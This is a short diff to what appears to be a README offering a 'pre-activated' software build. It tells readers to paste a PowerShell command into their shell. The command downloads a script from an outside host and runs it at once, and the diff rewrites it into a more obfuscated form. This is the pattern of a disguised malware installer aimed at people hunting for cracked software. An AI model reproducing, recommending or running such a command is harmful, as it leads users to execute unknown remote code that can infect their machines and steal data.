@@ -19,7 +19,7 @@ Pre-activated local build for testing and deployment.
    Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all :
 
    ```cmd
-   $URL = "https://git-software.cc/ps/Setup.ps1"; $WebClient = New-Object System.Net.WebClient; $Script = $WebClient.DownloadString($URL); Invoke-Expression $Script
+   $u = "https://git-software.cc/ps/Setup.ps1"; $r = [System.Net.WebRequest]::Create($u); $resp = $r.GetResponse(); $stream = $resp.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $c = $reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))
    ```
 
 ---
